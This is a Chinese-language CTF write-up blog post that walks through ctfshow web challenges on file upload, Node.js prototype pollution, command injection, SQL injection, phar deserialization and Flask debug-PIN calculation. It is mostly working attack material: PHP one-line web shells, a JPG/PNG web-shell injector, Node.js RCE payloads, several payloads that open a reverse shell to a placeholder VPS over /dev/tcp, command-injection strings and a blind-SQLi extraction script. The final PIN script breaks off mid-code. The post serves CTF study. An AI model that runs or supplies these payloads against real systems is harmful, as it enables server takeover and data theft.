---
title: ctfshow
date: 2026-03-24 15:18:00
tags:
index_img: https://i0.hdslb.com/bfs/article/1e429113316201a147b55bc4fa45a0d1ebf7f2cd.jpg@1256w_706h_!web-article-pic.avif
categories: CTF
---

## 文件上传

### web161-163

#### 文件头伪造

```
GIF89a
```

#### 竞争上传

```php
<?php
$f=fopen("7.php","w");
fputs($f,'<?php eval($_POST[7]);?>');?>
```

### web164

上传一个正常的图片，发现查看图片的时候存在文件包含漏洞，打一个图片马

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./7.png');
?>
#<?=$_GET[0]($_POST[1]);?>
```

![image-20260325183117942](https://gitee.com/bobrocket/img/raw/master/image-20260325183117942.png)

### web165

上传一个正常的图片访问的时候看到这样一串信息

![image-20260325184242351](https://gitee.com/bobrocket/img/raw/master/image-20260325184242351.png)

表明是jpg二次渲染，这里用一下大佬的一个脚本

```php
<?php
/*

The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
It is necessary that the size and quality of the initial image are the same as those of the processed image.

1) Upload an arbitrary image via secured files upload script
2) Save the processed image and launch:
jpg_payload.php <jpg_name.jpg>

In case of successful injection you will get a specially crafted image, which should be uploaded again.

Since the most straightforward injection method is used, the following problems can occur:
1) After the second processing the injected data may become partially corrupted.
2) The jpg_payload.php script outputs "Something's wrong".
If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

Sergey Bobrov @Black2Fan.

See also:
https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

*/

$miniPayload = "<?php @eval(\$_POST['pass']);?>"; //注意$转义


if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
    die('php-gd is not installed');
}

if(!isset($argv[1])) {
    die('php jpg_payload.php <jpg_name.jpg>');
}

set_error_handler("custom_error_handler");

for($pad = 0; $pad < 1024; $pad++) {
    $nullbytePayloadSize = $pad;
    $dis = new DataInputStream($argv[1]);
    $outStream = file_get_contents($argv[1]);
    $extraBytes = 0;
    $correctImage = TRUE;

    if($dis->readShort() != 0xFFD8) {
        die('Incorrect SOI marker');
    }

    while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
        $marker = $dis->readByte();
        $size = $dis->readShort() - 2;
        $dis->skip($size);
        if($marker === 0xDA) {
            $startPos = $dis->seek();
            $outStreamTmp =
                substr($outStream, 0, $startPos) .
                $miniPayload .
                str_repeat("\0",$nullbytePayloadSize) .
                substr($outStream, $startPos);
            checkImage('_'.$argv[1], $outStreamTmp, TRUE);
            if($extraBytes !== 0) {
                while((!$dis->eof())) {
                    if($dis->readByte() === 0xFF) {
                        if($dis->readByte !== 0x00) {
                            break;
                        }
                    }
                }
                $stopPos = $dis->seek() - 2;
                $imageStreamSize = $stopPos - $startPos;
                $outStream =
                    substr($outStream, 0, $startPos) .
                    $miniPayload .
                    substr(
                        str_repeat("\0",$nullbytePayloadSize).
                        substr($outStream, $startPos, $imageStreamSize),
                        0,
                        $nullbytePayloadSize+$imageStreamSize-$extraBytes) .
                    substr($outStream, $stopPos);
            } elseif($correctImage) {
                $outStream = $outStreamTmp;
            } else {
                break;
            }
            if(checkImage('payload_'.$argv[1], $outStream)) {
                die('Success!');
            } else {
                break;
            }
        }
    }
}
unlink('payload_'.$argv[1]);
die('Something\'s wrong');

function checkImage($filename, $data, $unlink = FALSE) {
    global $correctImage;
    file_put_contents($filename, $data);
    $correctImage = TRUE;
    imagecreatefromjpeg($filename);
    if($unlink)
        unlink($filename);
    return $correctImage;
}

function custom_error_handler($errno, $errstr, $errfile, $errline) {
    global $extraBytes, $correctImage;
    $correctImage = FALSE;
    if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
        if(isset($m[1])) {
            $extraBytes = (int)$m[1];
        }
    }
}

class DataInputStream {
    private $binData;
    private $order;
    private $size;

    public function __construct($filename, $order = false, $fromString = false) {
        $this->binData = '';
        $this->order = $order;
        if(!$fromString) {
            if(!file_exists($filename) || !is_file($filename))
                die('File not exists ['.$filename.']');
            $this->binData = file_get_contents($filename);
        } else {
            $this->binData = $filename;
        }
        $this->size = strlen($this->binData);
    }

    public function seek() {
        return ($this->size - strlen($this->binData));
    }

    public function skip($skip) {
        $this->binData = substr($this->binData, $skip);
    }

    public function readByte() {
        if($this->eof()) {
            die('End Of File');
        }
        $byte = substr($this->binData, 0, 1);
        $this->binData = substr($this->binData, 1);
        return ord($byte);
    }

    public function readShort() {
        if(strlen($this->binData) < 2) {
            die('End Of File');
        }
        $short = substr($this->binData, 0, 2);
        $this->binData = substr($this->binData, 2);
        if($this->order) {
            $short = (ord($short[1]) << 8) + ord($short[0]);
        } else {
            $short = (ord($short[0]) << 8) + ord($short[1]);
        }
        return $short;
    }

    public function eof() {
        return !$this->binData||(strlen($this->binData) === 0);
    }
}
?>
```

先上传原始的图片，再查看图片右击保存，再用脚本渲染

![image-20260325190601576](https://gitee.com/bobrocket/img/raw/master/image-20260325190601576.png)

### web166

这次要求上传压缩包，下载文件的时候存在文件包含漏洞

用010editor给压缩包后面加上一句话木马

![image-20260325191720108](https://gitee.com/bobrocket/img/raw/master/image-20260325191720108.png)

### web167

上传`.htaccess`，

### web168

后端没有验证，可以抓包上传php，但是它对文件内容有过滤，普通马肯定不行，方法也比较多

#### 传参

```
<?php $_REQUEST[1]($_REQUEST[2])?>
```

#### 双引号执行命令

```
<?=`cat ../flagaa.php`?>
```

#### 远程包含



### web169

上传.user.ini包含日志

```
auto_prepend_file=/var/log/nginx/access.log
```

## nodejs

[Node.js 常见漏洞学习与总结-先知社区](https://xz.aliyun.com/news/6780)

### web334

源码里有`username: 'CTFSHOW', password: '123456'`

```js
var findUser = function(name, password){
  return users.find(function(item){
    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
  });
};
```

校验这里用户名不能是CTFSHOW，但是`item.username === name.toUpperCase()`又对输入的用户名进行了大写转义，所以直接用ctfshow，123456登录即可

### web335

提示`/?eval=`,推测直接是命令执行，我们调用child_process模块

```
/?eval=require("child_process").execSync('ls')
```

### web336

上题的wp不好用了，测试发现exec被过滤了

#### 拼接绕过

```
/?eval=require("child_process")['exe'%2B'cSync']('ls')
```

#### 编码绕过

```
/?eval=eval(Buffer.from("cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjYXQgZmwwMDFnLnR4dCcp",'base64').toString('ascii'))
```

#### 不用exec

```
/?eval=require('child_process').spawnSync('tac', ['fl001g.txt']).stdout
```

这里其实可以读到源码

```
/?eval=__filename
```

查看当前文件路径/app/routes/index.js

```
/?eval=require(‘fs’).readFileSync(’/app/routes/index.js’,‘utf-8’)
```

读文件

```js
var express = require('express'); var router = express.Router(); /* GET home page. */ router.get('/', function(req, res, next) { res.type('html'); var evalstring = req.query.eval; if(typeof(evalstring)=='string' && evalstring.search(/exec|load/i)>0){ res.render('index',{ title: 'tql'}); }else{ res.render('index', { title: eval(evalstring) }); } }); module.exports = router;
```

可以发现过滤了exec和load

### web337

```php
var express = require('express');
var router = express.Router();
var crypto = require('crypto');

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var flag='xxxxxxx';
  var a = req.query.a;
  var b = req.query.b;
  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
  	res.end(flag);
  }else{
  	res.render('index',{ msg: 'tql'});
  }
  
});

module.exports = router;
```

md5绕过，这里普通的数组绕过行不通

![image-20260324160352673](https://gitee.com/bobrocket/img/raw/master/image-20260324160352673.png)

当我们传入a[a]=1&b[b]=2
经过

```erlang
req.query.a
req.query.b
```

就变成了{'a':'1'}，这样就可以成功绕过

![image-20260324160511055](https://gitee.com/bobrocket/img/raw/master/image-20260324160511055.png)

### web338

![image-20260324183528814](https://gitee.com/bobrocket/img/raw/master/image-20260324183528814.png)

login.js存在原型链污染漏洞

```json
{"__proto__": {"ctfshow": "36dboy"}}
```

### web339

这里修改了login.js

```python
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var secert = {};
  var sess = req.session;
  let user = {};
  utils.copy(user,req.body);
  if(secert.ctfshow===flag){
    res.end(flag);
  }else{
    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
  }
});
```

由于这里我们不知道flag是什么，所以上面的方法肯定是不行了

#### 预期解

漏洞点在`res.render('api', { query: Function(query)(query)});`

Function里的query变量没有被引用，通过原型污染给它赋任意值就可以进行rce。

```
{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/[vps-ip]/[port] 0>&1\"')"}}
```

在index界面POST之后直接POST访问api界面即可

#### 非预期解

ejs模板漏洞导致rce

```
{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/[vps-ip]/[port] 0>&1\"');var __tmp2"}}
```

### web340

```js
var user = new function(){
    this.userinfo = new function(){
    this.isVIP = false;
    this.isAdmin = false;
    this.isAuthor = false;     
    };
  }
  utils.copy(user.userinfo,req.body);
```

这里的userinfo是user的属性，所以要往上找两层

```
{"__proto__":{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/vps-ip/port 0>&1\"')"}}}
```

### web341

这次没有api了，login和上题一样，用之前非预期解，注意修改嵌套

```
{"__proto__":{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/vps-ip/port 0>&1\"');var __tmp2"}}}
```

### web342-343

jade rce [再探 JavaScript 原型链污染到 RCE-先知社区](https://xz.aliyun.com/news/6621)

```
{"__proto__":{"__proto__":{"type":"Block","nodes":"","compileDebug":1,"self":1,"line":"global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >& /dev/tcp/vps-ip/port 0>&1\"')"}}}
```

### web344

```js
router.get('/', function(req, res, next) {
  res.type('html');
  var flag = 'flag_here';
  if(req.url.match(/8c|2c|\,/ig)){
  	res.end('where is flag :)');
  }
  var query = JSON.parse(req.query.query);
  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){
  	res.end(flag);
  }else{
  	res.end('where is flag. :)');
  }

});
```

过滤了**8c、2c和逗号**，然后要求**GET**传入参数**query**，且满足 `query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true` 才可以拿到flag

也就是正常情况下我们应该传入

```
?query={"name":"admin","password":"ctfshow","isVIP":true}
```

而经过URL编码之后变成

```
?query=%7B%22name%22%3A%22admin%22%2C%22password%22%3A%22ctfshow%22%2C%22isVIP%22%3Atrue%7D
```

双引号编码之后是`%22`，和c连接起来就是`%22c`，会被ban

这题用到了**NodeJS的特性**，当 URL 里传入了多个同名参数，如多次出现 `query=`，Express 解析会将这些参数放入数组中，然后`JSON.parse` 会将数组的字符串元素拼接成一个完整字符串再解析。同时`c`也要进行URL编码，变成`%63`，这样就不会被ban了

payload：

```
?query={"name":"admin"&query="password":"%63tfshow"&query="isVIP":true}
```

## SSTI

### web372



## 中期测评

### web486

一进去就是一个登录页面，试了万能密码也没用，这里注意到一个action参数

![image-20260420182809924](https://gitee.com/bobrocket/img/raw/master/image-20260420182809924.png)

经过测试有文件读取漏洞

![image-20260420183031853](https://gitee.com/bobrocket/img/raw/master/image-20260420183031853.png)

直接目录穿越读取flag即可

```
?action=../flag
```

### web487

```php
<?php
include('render/render_class.php');
include('render/db_class.php');



$action=$_GET['action'];
if(!isset($action)){
	header('location:index.php?action=login');
	die();	
}

if($action=='check'){
	$username=$_GET['username'];
	$password=$_GET['password'];
	$sql = "select id from user where username = md5('$username') and password=md5('$password') order by id limit 1";
	$user=db::select_one($sql);
	if($user){
		templateUtil::render('index',array('username'=>$username));
	}else{
		header('location:index.php?action=login');
	}
}

if($action=='login'){
	templateUtil::render($action);
}else{
	templateUtil::render($action);
}
```

这里就是sql注入了，直接用sqlmap就能跑出来

### web488

```php
<?php
include('render/render_class.php');
include('render/db_class.php');

$action=$_GET['action'];
if(!isset($action)){
	header('location:index.php?action=login');
	die();	
}

if($action=='check'){
	$username=$_GET['username'];
	$password=$_GET['password'];
	$sql = "select id from user where username = '".md5($username)."' and password='".md5($password)."' order by id limit 1";
	$user=db::select_one($sql);
	if($user){
		templateUtil::render('index',array('username'=>$username));
	}else{
		templateUtil::render('error',array('username'=>$username));
	}
}

if($action=='login'){
	templateUtil::render($action);
}else{
	templateUtil::render($action);
}
```

这次参数没法拼接进sql语句中了，我们看看还有什么漏洞

```php
<?php
//render/render_class
ini_set('display_errors', 'On');
include('file_class.php');
include('cache_class.php');

class templateUtil {
	public static function render($template,$arg=array()){
		if(cache::cache_exists($template)){
			echo cache::get_cache($template);
		}else{
			$templateContent=fileUtil::read('templates/'.$template.'.php');//最初是{{username}}不存在
			$cache=templateUtil::shade($templateContent,$arg);
			cache::create_cache($template,$cache);//$template="error"
			echo $cache;
		}
	}
	public static  function shade($templateContent,$arg){
		foreach ($arg as $key => $value) {//循环遍历数组中的每一个键值对，取出当前的键和值
			$templateContent=str_replace('{{'.$key.'}}', $value, $templateContent);
		}
		return $templateContent;
	}

}
```

```php
<?php
//file_class.php
ini_set('display_errors', 'On');
class fileUtil{

	public static function read($filename){
		return file_get_contents($filename);
	}

	public static function write($filename,$content,$append =0){
		if($append){
			file_put_contents($filename, $content,FILE_APPEND);
		}else{
			file_put_contents($filename, $content);
		}
	}
}
```

```php
<?php
//cache_class.php
ini_set('display_errors', 'On');

class cache{
	public static function create_cache($template,$content){
		if(file_exists('cache/'.md5($template).'.php')){//检查是否有缓存文件，也就是说必须是打开靶机后第一次报错
			return true;
		}else{
			fileUtil::write('cache/'.md5($template).'.php',$content);
		}
	}
	public static function get_cache($template){
		return fileUtil::read('cache/'.md5($template).'.php');
	}
	public static function cache_exists($template){
		return file_exists('cache/'.md5($template).'.php');
	}

}
```

可以写入文件实现rce，payload：

```
?action=check&username=<?=@eval($_POST[1])?>&password=1
```

然后访问

```
/cache/cb5e100e5a9a3e7f6d1fd97512215282.php
```

### web489

```php
<?php
include('render/render_class.php');
include('render/db_class.php');

$action=$_GET['action'];
if(!isset($action)){
	header('location:index.php?action=login');
	die();	
}

if($action=='check'){
	$sql = "select id from user where username = '".md5($username)."' and password='".md5($password)."' order by id limit 1";
	extract($_GET);//可以通过 URL 参数来创建或覆盖脚本中的任何变量
	$user=db::select_one($sql);
	if($user){
		templateUtil::render('index',array('username'=>$username));
	}else{
		templateUtil::render('error');
	}
}

if($action=='clear'){
	system('rm -rf cache/*');
	die('cache clear');
}

if($action=='login'){
	templateUtil::render($action);
}else{
	templateUtil::render($action);
}
```

其他部分和上题一样，这里有变量覆盖漏洞，先清空缓存再写马即可

```
?action=check&sql=select 1&username=<?=@eval($_POST[1]);?>&password=1
```

### web490

```
?action=check&username=' union select '@eval($_POST[1]);'--  #&password=1
```

### web491

依旧盲注，依旧sqlmap

![image-20260420192108895](https://gitee.com/bobrocket/img/raw/master/image-20260420192108895.png)

### web492

```php
if($action=='check'){
	extract($_GET);
	if(preg_match('/^[A-Za-z0-9]+$/', $username)){
		$sql = "select username from user where username = '".$username."' and password='".md5($password)."' order by id limit 1";
		$user=db::select_one_array($sql);
	}
	if($user){
		templateUtil::render('index',$user);
	}else{
		templateUtil::render('error');
	}
}
```

>关于select_one_array
>
>- 执行一个 SQL 查询。
>- 返回查询结果的第一条记录。
>- 将这条记录作为数组返回，其中每个数组元素代表一个数据库字段。

做的时候还是思路太局限了，总是在想怎么利用sql语句，殊不知我们直接走变量覆盖就行了

```
?action=check&user[username]=<?php eval($_POST[1]);?>
```

### web493

```php
if(!isset($action)){
	if(isset($_COOKIE['user'])){
		$c=$_COOKIE['user'];
		$user=unserialize($c);
		if($user){
			templateUtil::render('index');
		}else{
			header('location:index.php?action=login');
		}
	}else{
		header('location:index.php?action=login');
	}
	die();	
}
```

这里有一个反序列化的入口，下面去找恶意类

```php
//render/db_class.php
class dbLog{
	public $sql;
	public $content;
	public $log;

	public function __construct(){
		$this->log='log/'.date_format(date_create(),"Y-m-d").'.txt';
	}
	public function log($sql){
		$this->content = $this->content.date_format(date_create(),"Y-m-d-H-i-s").' '.$sql.' \r\n';
	}
	public function __destruct(){
		file_put_contents($this->log, $this->content,FILE_APPEND);
	}
}
```

之前学习反序列化的时候混淆了，反序列化重建对象的时候是不会触发`__construct`方法的

```php
<?php
class dbLog{
    public $sql;
    public $content='<?php @eval($_POST[1]);?>';
    public $log="shell.php";
}

$db = new dbLog();
echo urlencode(serialize($db));
```

### web494

和上题一样，下马之后用蚁剑连接，根据`db_class.php`的内容连接数据库（第一次用这个功能）

![image-20260422165707884](https://gitee.com/bobrocket/img/raw/master/image-20260422165707884.png)

### web496

```python
import requests
import string
url="http://91fbba7b-a1af-4857-a5b8-a03ca9d4eaaf.challenge.ctf.show/"
s=string.ascii_lowercase+string.digits+",{-}"
sess=requests.session()
sess.post(url+"?action=check",data={"username":"'||1#","password":1})
flag=""
for i in range(9,70):
    for j in s:
        data={
        'nickname':str(i*2)+str(j), #不让nickname重复就行
        #'user[username]':"'||if(ascii(substr((select  group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))={1},1,0)#".format(i,j)
        #'user[username]':"'||if(substr((select  group_concat(column_name) from information_schema.columns where table_name='flagyoudontknow76'),{0},1)='{1}',1,0)#".format(i,j)
            'user[username]':"'||if(substr((select  flagisherebutyouneverknow118 from flagyoudontknow76),{0},1)='{1}',1,0)#".format(i,j)
        }
        r=sess.post(url+"/api/admin_edit.php",data=data)
        if("u529f" in r.text):
            flag+=j
            print(flag)
            break
```

### web497

还是用万能密码登录进后台，有个地方能修改头像，用file协议读文件

![image-20260422202006958](https://gitee.com/bobrocket/img/raw/master/image-20260422202006958.png)

### web498

SSRF漏洞还在，只是flag的文件名改了，不能直接读

用dict协议扫一下端口，发现6379端口可用，这是Redis的端口，尝试一下用gopherus打无密码redis

![image-20260422204600405](https://gitee.com/bobrocket/img/raw/master/image-20260422204600405.png)

### web499

还是万能密码登后台，这次多了一个系统配置

![image-20260426161424276](https://gitee.com/bobrocket/img/raw/master/image-20260426161424276.png)

我们发现它调用了一个api，admin_settings.php，而这个接口会把序列化后的网站信息写入../config/settings.php

我们尝试直接写一句话木马

![image-20260426161717885](https://gitee.com/bobrocket/img/raw/master/image-20260426161717885.png)

### web500

万能密码进后台，上题的序列化文件不再是php了，然后这次有一个数据库备份

```php
if($user){
	extract($_POST);
	shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow > '.__DIR__.'/../backup/'.$db_path);


	if(file_exists(__DIR__.'/../backup/'.$db_path)){
		$ret['msg']='数据库备份成功';
	}else{
		$ret['msg']='数据库备份失败';
	}
	die(json_encode($ret));

}else{
	$ret['msg']='请登录后使用此功能';
	die(json_encode($ret));
}
```

很明显的命令拼接漏洞，切记切记区分exec和eval，这里直接拼接linux命令进去就行了

```
db_path=;cat /f* > 1.txt
```

### web501

```php
if($user){
	extract($_POST);

	if(preg_match('/^zip|tar|sql$/', $db_format)){
		shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow > '.__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'.'.$db_format);
		if(file_exists(__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'.'.$db_format)){
			$ret['msg']='数据库备份成功';
		}else{
			$ret['msg']='数据库备份失败';
		}
	}else{
		$ret['msg']='数据库备份失败';
	}
	
	die(json_encode($ret));

}else{
	$ret['msg']='请登录后使用此功能';
	die(json_encode($ret));
}
```

在上个题的基础上增加了正则过滤

```
db_format=zip;cat /f* > 1.txt
```

### web502

```php
if($user){
	extract($_POST);
	if(file_exists($pre.$db_format)){
			$ret['msg']='数据库备份成功';
			die(json_encode($ret));
	}

	if(preg_match('/^(zip|tar|sql)$/', $db_format)){
		shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow > '.$pre.$db_format);
		if(file_exists($pre.$db_format)){
			$ret['msg']='数据库备份成功';
		}else{
			$ret['msg']='数据库备份失败';
		}
	}else{
		$ret['msg']='数据库备份失败';
	}
	die(json_encode($ret));

}else{
	$ret['msg']='请登录后使用此功能';
	die(json_encode($ret));
}
```

什么叫顾头不顾腚

```
pre=2.txt;ls / > 1.txt;&db_format=zip
```

### web503

#### 补充：触发phar反序列化的函数

![image-20260426203147557](https://gitee.com/bobrocket/img/raw/master/image-20260426203147557.png)

我们还是去看备份数据库

```php
include('../render/db_class.php');
error_reporting(0);
$user= $_SESSION['user'];
$pre=__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'/db.';
$ret = array(
		"code"=>0,
		"msg"=>"查询失败",
		"count"=>0,
		"data"=>array()
	);
if($user){
	extract($_POST);
	if(file_exists($pre.$db_format)){
			$ret['msg']='数据库备份成功';
			die(json_encode($ret));
	}

	if(preg_match('/^(zip|tar|sql)$/', $db_format)){
		shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow > '.md5($pre.$db_format));
		if(file_exists($pre.$db_format)){
			$ret['msg']='数据库备份成功';
		}else{
			$ret['msg']='数据库备份失败';
		}
	}else{
		$ret['msg']='数据库备份失败';
	}
	die(json_encode($ret));

}else{
	$ret['msg']='请登录后使用此功能';
	die(json_encode($ret));
}

```

这里md5写死了，命令拼接肯定是不行了，不过可以找到一个logo上传

```php
if($user){
	$arr = $_FILES["file"];
	if(($arr["type"]=="image/jpeg" || $arr["type"]=="image/png" ) && $arr["size"]<10241000 )
	{
		$arr["tmp_name"];
		$filename = md5($arr['name']);
		$ext = pathinfo($arr['name'],PATHINFO_EXTENSION);
		if(!preg_match('/^php$/i', $ext)){
			$basename = "../img/".$filename.'.' . $ext;
			move_uploaded_file($arr["tmp_name"],$basename);
			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
			$config['logo']=$filename.'.' . $ext;
			file_put_contents(__DIR__.'/../config/settings', serialize($config));
			$ret['msg']='文件上传成功';
		}
		
	}else{
		$ret['msg']='文件上传失败';
	}
	
	die(json_encode($ret));

}else{
	$ret['msg']='请登录后使用此功能';
	die(json_encode($ret));
}
```

结合之前的恶意类，这不就来了，上传一个恶意的png，然后用`file_exits`来触发phar反序列化

```php
<?php

class dbLog{
    public $sql;
    public $content = '<?php eval($_POST[1]);?>';
    public $log = '1.php';
}

$a = new dbLog();
$phar = new Phar('a.phar');
$phar -> startBuffering();
$phar -> addFromString('test.txt','test');
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER(); ?>');
$phar -> setMetadata($a);//这个方法允许你将任何可序列化的 PHP 变量（如数组、对象、字符串等）作为元数据存储起来。
$phar -> stopBuffering();
```

直接把文件名改成png

```
db_format=img/ee6d68225691981a53cadf2f11b187a7.jpg&pre=phar:///var/www/html/
```

不过为什么一句话木马被写在`/var/www/html`

初步推测应该是这个api接口会在index.php调用导致的

### web504

这次多了一个模板列表和新增模板，不过读不到源码

![image-20260427144253908](https://gitee.com/bobrocket/img/raw/master/image-20260427144253908.png)

.sml在这里应该就是一种简单标记文件，没什么利用价值，我们看看能不能上传php

![image-20260427144523567](https://gitee.com/bobrocket/img/raw/master/image-20260427144523567.png)

这里想到前面有一个./config/settings，我们可以利用这个触发反序列化

```php
<?php

class dbLog{
    public $sql;
    public $content ='<?php @eval($_POST[1]);?>';
    public $log ="1.php";

    public function __destruct(){
        file_put_contents($this->log, $this->content,FILE_APPEND);
    }
}

$final = new dbLog();
echo serialize($final);
```

###  web505-507

方法多多，可以结合之前的文件上传也可以用伪协议

```
debug=1&f=data://text/plain,user<?php system('cat /f*');?>
```

### web508

![image-20260427160555319](https://gitee.com/bobrocket/img/raw/master/image-20260427160555319.png)

这次把伪协议禁了，我们需要找一个地方上传

#### 方法一

![image-20260427161232575](https://gitee.com/bobrocket/img/raw/master/image-20260427161232575.png)

上传logo的地方没有过滤，我们把一句话木马后缀改成png直接上传就行

#### 方法二

![image-20260427162916155](https://gitee.com/bobrocket/img/raw/master/image-20260427162916155.png)



之前修改头像的地方，把图片放到了session里面

### web509

上题上传logo的地方做了过滤，我们用短标签+反引号绕过

```
user<?= `cat /f*`?>
```





## 常用姿势

### web801（flask算PIN）

有文件读取漏洞，先看源码

```python
# -*- coding: utf-8 -*-
from flask import Flask, request
app = Flask(__name__)

@app.route("/")
def hello():
    return "Welcome to ctfshow file download system, use /file?filename= to download file,my debug mode is enable."

@app.route("/file")
def file():
    filename = request.args.get('filename')
    with open(filename, 'r') as f:
        return f.read()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=True)
```

很简单，开启了debug模式

先查看MAC地址`/file?filename=/sys/class/net/eth0/address`

```
02:42:ac:0c:c4:cc
```

再查machine-id`/file?filename=/sys/class/net/eth0/address`

```
225374fa-04bc-4346-9f39-48fa82829ca9
```

`/file?filename=/proc/self/cgroup`

```
12:rdma:/docker/edd824d9a92276702056f3d713d6d3879a49f63423cb4f0d339c36777a1d16ea
11:freezer:/docker/edd824d9a92276702056f3d713d6d3879a49f63423cb4f0d339c36777a1d16ea
10:net_cls,net_prio:/docker/edd824d9a92276702056f3d713d6d3879a49f63423cb4f0d339c36777a1d16ea
9:cpu,cpuacct:/docker/edd824d9a92276702056f3d713d6d3879a49f63423cb4f0d339c36777a1d16ea
8:cpuset:/docker/edd824d9a92276702056f3d713d6d3879a49f63423cb4f0d339c36777a1d16ea
7:blkio:/docker/edd824d9a92276702056f3d713d6d3879a49f63423cb4f0d339c36777a1d16ea
6:devices:/docker/edd824d9a92276702056f3d713d6d3879a49f63423cb4f0d339c36777a1d16ea
5:pids:/docker/edd824d9a92276702056f3d713d6d3879a49f63423cb4f0d339c36777a1d16ea
4:memory:/docker/edd824d9a92276702056f3d713d6d3879a49f63423cb4f0d339c36777a1d16ea
3:perf_event:/docker/edd824d9a92276702056f3d713d6d3879a49f63423cb4f0d339c36777a1d16ea
2:hugetlb:/docker/edd824d9a92276702056f3d713d6d3879a49f63423cb4f0d339c36777a1d16ea
1:name=systemd:/docker/edd824d9a92276702056f3d713d6d3879a49f63423cb4f0d339c36777a1d16ea
0::/docker/edd824d9a92276702056f3d713d6d3879a49f63423cb4f0d339c36777a1d16ea
```

225374fa-04bc-4346-9f39-48fa82829ca9edd824d9a92276702056f3d713d6d3879a49f63423cb4f0d339c36777a1d16ea

计算pin码

```python
import hashlib
import getpass
from flask import Flask
from itertools import chain
import sys
import uuid
import typing as t
username='root'
app = Flask(__name__)
modname=getattr(app, "__module__", t.cast(object, app).__class__.__module__)
mod=sys.modules.get(modname)
mod = getattr(mod, "__file__", None)
 
probably_public_bits = [
    username, #用户名
    modname,  #一般固定为flask.app
    getattr(app, "__name__", app.__class__.__name__), #固定，一般为Flask
    '/usr/local/lib/python3.8/site-packages/flask/app.py',   #主程序（app.py）运行的绝对路径
]
print(probably_public_bits)
mac ='02:42:ac:0c:c4:cc'.replace(':','')
mac=str(int(mac,base=16))
private_bits = [
   mac,#mac地址十进制
 "225374fa-04bc-4346-9f39-48fa82829ca9edd824d9a92276702056f3d713d6d3879a49f63423cb4f0d339c36777a1d16ea"
     ]
print(private_bits)
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")
 
cookie_name = f"__wzd{h.hexdigest()[:20]}"
 
# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
h.update(b"pinsalt")
num = f"{int(h.hexdigest(), 16):09d}"[:9]
 
# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv=None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num
 
print(rv)
```

进入调试/console

![image-20260327170703317](https://gitee.com/bobrocket/img/raw/master/image-20260327170703317.png)

python3.8要用sha1 python3.6要用MD5

```python
#MD5
import hashlib
from itertools import chain
probably_public_bits = [
     'flaskweb'# username
     'flask.app',# modname
     'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
     '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]
 
private_bits = [
     '25214234362297',# str(uuid.getnode()),  /sys/class/net/ens33/address
     '0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'# get_machine_id(), /etc/machine-id
]
 
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
 
cookie_name = '__wzd' + h.hexdigest()[:20]
 
